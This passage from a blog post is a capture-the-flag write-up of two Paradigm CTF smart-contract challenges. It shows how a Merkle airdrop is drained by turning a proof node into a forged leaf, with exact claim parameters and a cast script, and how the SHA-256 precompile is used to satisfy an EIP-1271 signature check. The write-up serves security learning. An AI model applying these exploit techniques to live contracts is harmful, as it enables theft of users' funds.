<pre tabindex="0"><code>0xd48451c19959e2d9bd4e620fbe88aa5f6f7ea72a00000f40f0c122ae08d2207b
</code></pre><p>Don&rsquo;t tell me this is a coincidence. ðŸ˜‚ The last 12 bytes (<code>uint96</code>) is <code>00000f40f0c122ae08d2207b</code>, which is
72033437049132565012603 in the decimal system, or 72033.437049132565012603 tokens (with 18 decimals):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ cast --to-dec 00000f40f0c122ae08d2207b<span class="p">|</span> cast --from-wei
</span></span><span class="line"><span class="cl">72033.437049132565012603
</span></span></code></pre></div><p>Which is less than the total amount of tokens in the tree (75,000).</p>
<p>Don&rsquo;t. Tell. Me. This. Is. A. Coincidence.</p>
<p>Now, if we subtract this amount from 75,000e18:</p>
<pre tabindex="0"><code>2966562950867434987397
</code></pre><p>And convert it to hex:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ cast --to-hex <span class="m">2966562950867434987397</span>
</span></span><span class="line"><span class="cl">0xa0d154c64a300ddf85
</span></span></code></pre></div><p>And try to find this number in <code>tree.json</code>:</p>
<pre tabindex="0"><code>8 &#34;0x249934e4C5b838F920883a9f3ceC255C0aB3f827&#34; &#34;0xa0d154c64a300ddf85&#34;  ...
</code></pre><p>Too many coincidences!</p>
<p>So, what do we do?</p>
<p>We will make the first proof in the list of proofs of leaf 37 <strong>a leaf itself</strong>.</p>
<p>We can pass the proof with multiple 00 as the second half of the input to <code>node</code> in <code>claim</code> function:</p>
<ol>
<li><code>0xd48451c19959e2d9bd4e620fbe88aa5f6f7ea72a</code> would be an address,</li>
<li><code>0x00000f40f0c122ae08d2207b</code> would be an amount.</li>
</ol>
<p>But we need the index. And it cannot be an arbitrary number because it&rsquo;s hashed with the address and the amount, and
the resulting hash is hashed with the other proofs. But remember that proofs are concatenated and that the index
is also concatenated with the address and the amount.</p>
<p>We need the other hash as the index! And it&rsquo;s the hash of leaf 37! Remember that leaves are hashed and then their hashes
are grouped in pairs and hashed again. So leaf 37&rsquo;s hash is grouped with the first proof in its proofs array.</p>
<p>The hash of leaf 37 is:</p>
<pre tabindex="0"><code>0xd43194becc149ad7bf6db88a0ae8a6622e369b3367ba2cc97ba1ea28c407c442
</code></pre><p>We now have all the parameter to call <code>claim</code>:</p>
<ol>
<li>index: <code>0xd43194becc149ad7bf6db88a0ae8a6622e369b3367ba2cc97ba1ea28c407c442</code>;</li>
<li>address: <code>0xd48451c19959e2d9bd4e620fbe88aa5f6f7ea72a</code>;</li>
<li>amount: <code>0x00000f40f0c122ae08d2207b</code>;</li>
<li>proofs: the rest of leaf 37 proofs.</li>
</ol>
<p>By using these parameters, we&rsquo;ll claim 72033.437049132565012603 of tokens. And we also need to claim leaf 8 to claim
the remaining tokens. After that, we&rsquo;ll have all the tokens claimed by running only two claims.</p>
<p>To solve the challenge, I made this text file:
<a href="https://gist.github.com/Jeiwan/f6d6021fbce34ef1220d113a2a5bdb4e">https://gist.github.com/Jeiwan/f6d6021fbce34ef1220d113a2a5bdb4e</a></p>
<p>And ran this script:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="k">while</span> <span class="nb">read</span> -r line<span class="p">;</span> <span class="k">do</span>
</span></span><span class="line"><span class="cl">  <span class="nb">echo</span> <span class="s2">&#34;CLAIM&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="nb">echo</span> <span class="nv">$line</span><span class="p">|</span> xargs cast send --private-key <span class="nv">$private_key</span> --legacy <span class="nv">$distributor</span> <span class="s2">&#34;claim(uint256,address,uint96,bytes32[])&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">done</span> &lt;merkledrop
</span></span></code></pre></div><h2 id="vanity">Vanity</h2>
<blockquote>
<p>Just think of the gas savings!</p>
</blockquote>
<p>In this challenge you&rsquo;re attacked with a lot of psyops. The challenge really tries to push you into generating an
address with 16 zero bytes (00) using tools like <a href="https://github.com/johguse/profanity">profanity</a>. However, getting
that many zero bytes in an address is a very-very hard computational task that cannot be solved a reasonable amount
of time.</p>
<p>So there must be another way.</p>
<p>There are multiple places in the code that offer us different solutions:</p>
<ol>
<li>They tell us we can try to create sender address address that has &gt;= 16 zeros. This is not possible.
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">solve</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">solve</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div></li>
<li>They tell us we can try to hack <code>ecrecover</code>. Even though there are multiple malleability possibilities with <code>ecrecover</code>,
they&rsquo;re all fixed in the code. So, nope.
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="p">(</span><span class="kt">address</span> <span class="n">recovered</span><span class="p">,</span> <span class="n">ECDSA</span><span class="p">.</span><span class="n">RecoverError</span> <span class="n">error</span><span class="p">)</span> <span class="o">=</span> <span class="n">ECDSA</span><span class="p">.</span><span class="n">tryRecover</span><span class="p">(</span><span class="n">hash</span><span class="p">,</span> <span class="n">signature</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">error</span> <span class="o">==</span> <span class="n">ECDSA</span><span class="p">.</span><span class="n">RecoverError</span><span class="p">.</span><span class="n">NoError</span> <span class="o">&amp;&amp;</span> <span class="n">recovered</span> <span class="o">==</span> <span class="n">signer</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div></li>
<li>Finally, they&rsquo;re telling we can deploy a contract at an address that contains many zero bytes and implement <a href="https://eips.ethereum.org/EIPS/eip-1271">EIP1271</a>
in it. Again, this boils down to generating an address with many zeros. So, nope again.
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,</span> <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">result</span><span class="p">)</span> <span class="o">=</span> <span class="n">signer</span><span class="p">.</span><span class="n">staticcall</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSelector</span><span class="p">(</span><span class="n">IERC1271</span><span class="p">.</span><span class="n">isValidSignature</span><span class="p">.</span><span class="nb">selector</span><span class="p">,</span> <span class="n">hash</span><span class="p">,</span> <span class="n">signature</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="p">(</span><span class="n">success</span> <span class="o">&amp;&amp;</span> <span class="n">result</span><span class="p">.</span><span class="n">length</span> <span class="o">==</span> <span class="mi">32</span> <span class="o">&amp;&amp;</span> <span class="nb">abi</span><span class="p">.</span><span class="nb">decode</span><span class="p">(</span><span class="n">result</span><span class="p">,</span> <span class="p">(</span><span class="kt">bytes4</span><span class="p">))</span> <span class="o">==</span> <span class="n">IERC1271</span><span class="p">.</span><span class="n">isValidSignature</span><span class="p">.</span><span class="nb">selector</span><span class="p">);</span>
</span></span></code></pre></div></li>
</ol>
<p>But what if there&rsquo;s already a contract at an address with &gt;= 16 zeros? And, in fact, <a href="https://www.evm.codes/precompiled">there multiple of them</a>.
Ethereum has multiple advanced functionalities deployed at addresses: 0x0000000000000000000000000000000000000001,
0x0000000000000000000000000000000000000002, 0x0000000000000000000000000000000000000003, etc.</p>
<p>If this is not what we need then what?</p>
<p>Looking at <a href="https://www.evm.codes/precompiled">the list of such advanced functions</a> and keeping in mind the restrictions
we have to meet:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="k">return</span> <span class="p">(</span><span class="n">success</span> <span class="o">&amp;&amp;</span> <span class="n">result</span><span class="p">.</span><span class="n">length</span> <span class="o">==</span> <span class="mi">32</span> <span class="o">&amp;&amp;</span> <span class="nb">abi</span><span class="p">.</span><span class="nb">decode</span><span class="p">(</span><span class="n">result</span><span class="p">,</span> <span class="p">(</span><span class="kt">bytes4</span><span class="p">))</span> <span class="o">==</span> <span class="n">IERC1271</span><span class="p">.</span><span class="n">isValidSignature</span><span class="p">.</span><span class="nb">selector</span><span class="p">);</span>
</span></span></code></pre></div><p>We can see only one candidate: SHA-256 function deployed at <a href="https://etherscan.io/address/0x0000000000000000000000000000000000000002">0x0000000000000000000000000000000000000002</a>.</p>
<blockquote>
<p>It&rsquo;s not a smart contract so it&rsquo;s code is not shown on Etherscan. But it&rsquo;s there, believe me.</p>
</blockquote>
<p>This brings us to the following task: find a SHA-256 hash for input data that starts with:</p>
<pre tabindex="0"><code>0x1626ba7e
19bb34e293bba96bf0caeea54cdd3d2dad7fdf44cbea855173fa84534fcfb528
</code></pre><p>And the hash itself starts with <code>1626ba7e</code>. We also must be aware of how ABI packs dynamic arrays:</p>
<ol>
<li>first 32 bytes store the offset of the array in calldata;</li>
<li>second 32 bytes store the size of the array;</li>
<li>the rest is the array itself.</li>
</ol>
<p>So the input data to the SHA-256 precompiled contract must start with:</p>
<pre tabindex="0"><code>0x1626ba7e
19bb34e293bba96bf0caeea54cdd3d2dad7fdf44cbea855173fa84534fcfb528
0000000000000000000000000000000000000000000000000000000000000040
00000000000000000000000000000000000000000000000000000000000000XX
</code></pre><p>Where XX is the size of the byte array.</p>
<p>To solve the challenge, I wrote a simple Golang program that brute forces SHA-256:
<a href="https://github.com/Jeiwan/vanitycruncher-go">vanitycruncher-go</a>.</p>
<p>It took it about an hour to find a correct hash. (And it took me 3 attempts to fix all the bugs in the code ðŸ¤¦â€â™‚ï¸ and figure
out it&rsquo;s SHA-256, not Keccak ðŸ¤¦â€â™‚ï¸)</p>
<blockquote>
<p>I wouldn&rsquo;t have solved this challenge without <a href="https://twitter.com/save_as_jay">@save_as_jay</a> He reached out to me and
asked for help to brute force the hash, and, by that time, I had now idea that a precompiled contract needs to be used
in the challenge. So my part was only mining the hash.</p>
</blockquote>
<p>We finished this challenge at late night 20 minutes before the competition was over.</p>
<h1 id="wrap-up">Wrap-up</h1>
<p>This was a fantastic challenge! An absolute beast! Even though I spent a lot of time preparing to it and solving the
challenges from Paradigm CTF 2021, I haven&rsquo;t solve that many challenges. This means there&rsquo;s a lot to learn, and
this challenge became a huge motivation for me to keep pushing and get better in Solidity and smart contracts security.</p>
<p>Thanks for reading!</p>


  </article>

<hr>
<br>



<style>
.support {
  border: 4px solid #f47edd;
  border-radius: 10px;
  padding: 1.6em;
  text-align: center;
}

.support p {
  margin-bottom: 1em;
}

.support button {
  cursor: pointer;
  background: #f47edd;
  border: 1px solid #f47edd;
  border-radius: 4px;
  color: #fff;
  font-family: "Arvo", serif;
  font-size: 1em;
  text-transform: uppercase;
  padding: 0.3em 0.6em;
}
</style>

<div class="support">
  <p>
    If you found this post useful, consider supporting the author.
  </p>
  <div>
    <button id="eth-button">Send ETH</button>
  </div>
  <small>You can send any amount to <a href="https://etherscan.io/address/0xaf8dde65b84ae5d77e4f9a18cdc854e324a41b04" target="_blank">jeiwan.eth</a></small>
</div>

<script>
  var tipButton = document.querySelector('#eth-button');
  var address = '0xAF8Dde65b84ae5d77E4F9A18cDC854E324A41B04';

  tipButton.addEventListener('click', function () {
    if (typeof window.ethereum === 'undefined') {
      return alert('Metamask is not installed! You can support by sending ETH to ' + address + '. Thank you!');
    }

    window.ethereum.request({ method: 'eth_requestAccounts' }).then(function (accs) {
      var acc = accs[0];
      var params = {
        from: acc,
        to: address,
        value: '0x11c37937e08000' 
      };
      window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [params]
      });
    });
  })
</script>


      <footer class="site-footer">
        <span itemscope itemtype="http://schema.org/Person">
          <link itemprop="url" href="https://jeiwan.net">

          Author:
          <span itemprop="name">Ivan Kuznetsov</span>

          <br>

          Get in touch:

          <a itemprop="sameAs" href="mailto:me@jeiwan.ru" target="_blank">E-mail</a>

          <a itemprop="sameAs" href="https://t.me/jeiwan" title="Telegram" target="_blank">Telegram</a>

          <a itemprop="sameAs" href="https://twitter.com/jeiwan7" title="Twitter" target="_blank">Twitter</a>

          <a itemprop="sameAs" href="https://github.com/jeiwan" title="GitHub" target="_blank">GitHub</a>

          
        </span>

        <br><br>

        <div style="text-align:center">
          <small>
            <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-sa/4.0/88x31.png" /></a><br />Content of this site is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/">Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License</a>.
          </small>
        </div>

        
      </footer>
    </div>

  

    <script src="/js/prism.js"></script>

  </body>
</html>

